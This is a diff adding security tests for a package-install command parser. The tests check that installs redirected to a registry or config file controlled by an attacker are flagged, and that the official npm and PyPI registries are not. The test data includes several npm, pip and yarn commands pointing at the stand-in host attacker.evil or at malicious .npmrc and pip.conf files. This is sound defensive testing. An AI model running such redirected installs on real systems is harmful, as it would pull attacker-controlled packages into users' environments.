@@ -162,6 +162,76 @@ describe("parseInstallCommand — bypass resistance (security)", () => {
     assert.deepEqual(parseInstallCommand("sudo npm i evil").refs, ["npm:evil"]);
   });
 
+  it("CRIT-REGISTRY: a registry/index redirect is fail-closed (triage-PASS-while-installing-evil bypass)", () => {
+    // env-var redirects → the triaged NAME isn't what installs
+    for (const cmd of [
+      "npm_config_registry=http://attacker.evil/ npm i lodash",
+      "NPM_CONFIG_REGISTRY=http://attacker.evil/ npm i lodash",
+      "PIP_INDEX_URL=http://attacker.evil/ pip install requests",
+      "PIP_EXTRA_INDEX_URL=http://attacker.evil/ pip install requests",
+      "UV_INDEX_URL=http://attacker.evil/ pip install requests",
+    ]) {
+      const p = parseInstallCommand(cmd);
+      assert.equal(p.isInstall, true, cmd);
+      assert.ok(
+        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
+        `must be unverifiable: ${cmd}`,
+      );
+    }
+    // flag-form redirects (equals and separate value), npm + pip
+    for (const cmd of [
+      "npm i lodash --registry=http://attacker.evil/",
+      "npm i lodash --registry http://attacker.evil/",
+      "pip install requests -i http://attacker.evil/",
+      "pip install requests --index-url http://attacker.evil/",
+    ]) {
+      const p = parseInstallCommand(cmd);
+      assert.ok(
+        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
+        `must be unverifiable: ${cmd}`,
+      );
+    }
+    // indirect + less-obvious redirect vectors (2nd red-team pass)
+    for (const cmd of [
+      "YARN_NPM_REGISTRY_SERVER=http://attacker.evil/ yarn add lodash", // yarn berry
+      "NPM_CONFIG_USERCONFIG=/tmp/evil.npmrc npm i lodash", // attacker .npmrc
+      "NPM_CONFIG_GLOBALCONFIG=/tmp/evil.npmrc npm i lodash",
+      "PIP_CONFIG_FILE=/tmp/evil.conf pip install requests", // attacker pip.conf
+      "env 'npm_config_@scope:registry=http://attacker.evil/' npm i @scope/pkg", // scoped
+    ]) {
+      const p = parseInstallCommand(cmd);
+      assert.ok(
+        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
+        `must be unverifiable: ${cmd}`,
+      );
+    }
+  });
+
+  it("CRIT-REGISTRY: a special-char env assignment can't hide the install entirely", () => {
+    // `env 'a:b=1' npm i evil` left `a:b=1` as argv[0] before the broadened strip,
+    // so NO matcher fired and the install was fully undetected (worst case).
+    assert.deepEqual(parseInstallCommand("env 'a:b=1' npm i evil".replace(/'/g, "")).refs, [
+      "npm:evil",
+    ]);
+    assert.equal(parseInstallCommand("a:b=1 npm i evil").isInstall, true);
+  });
+
+  it("CRIT-REGISTRY: the canonical public registry/index is NOT flagged (no false-positive)", () => {
+    assert.deepEqual(
+      parseInstallCommand("npm_config_registry=https://registry.npmjs.org npm i lodash").refs,
+      ["npm:lodash"],
+    );
+    assert.deepEqual(
+      parseInstallCommand("npm_config_registry=https://registry.npmjs.org npm i lodash")
+        .unverifiable,
+      [],
+    );
+    assert.deepEqual(
+      parseInstallCommand("pip install requests -i https://pypi.org/simple").unverifiable,
+      [],
+    );
+  });
+
   it("CRIT-2: package runners (npm exec / pnpm dlx / yarn dlx / bun x) are gated", () => {
     assert.deepEqual(parseInstallCommand("npm exec evil").refs, ["npm:evil"]);
     assert.deepEqual(parseInstallCommand("pnpm dlx evil").refs, ["npm:evil"]);
